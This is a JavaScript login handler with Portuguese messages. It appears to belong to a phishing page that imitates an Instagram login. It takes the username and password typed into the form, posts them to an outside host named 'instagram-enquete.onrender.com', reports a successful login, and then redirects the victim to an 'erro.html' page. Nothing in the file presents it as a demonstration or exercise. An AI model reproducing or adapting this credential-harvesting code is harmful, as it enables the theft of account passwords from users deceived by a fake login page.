document.addEventListener('DOMContentLoaded', () => {
  const loginButton = document.querySelector('.btn-submit');
  const userInput = document.querySelector('input[type="text"]');
  const passwordInput = document.querySelector('input[type="password"]');

  // Define dinamicamente a URL da API (Render em produção ou localhost no desenvolvimento)
  const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:8080/api/login'
  : 'https://instagram-enquete.onrender.com/api/login'; // <--- Ajustado aqui com "-enquete"
  if (loginButton) {
    loginButton.addEventListener('click', async (event) => {
      event.preventDefault();

      const username = userInput.value.trim();
      const password = passwordInput.value.trim();

      if (username === '' || password === '') {
        alert('Por favor, preencha o nome de utilizador e a palavra-passe.');
        return;
      }

      const dadosLogin = {
        usuario: username,
        senha: password
      };

      try {
        const originalText = loginButton.textContent;
        loginButton.textContent = 'A entrar...';
        loginButton.disabled = true;

        const resposta = await fetch(API_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(dadosLogin)
        });

        if (resposta.ok) {
          const resultado = await resposta.json();
          alert('Login efetuado com sucesso!');
          console.log('Resposta do servidor:', resultado);

          // Redireciona para a página de erro/confirmação
          window.location.href = 'erro.html';
        } else {
          alert('Erro nas credenciais ou no servidor.');
          loginButton.textContent = originalText;
          loginButton.disabled = false;
        }

      } catch (erro) {
        console.error('Erro na requisição:', erro);
        alert('Não foi possível conectar ao servidor.');
        loginButton.textContent = 'Entrar';
        loginButton.disabled = false;
      }
    });
  }
}); 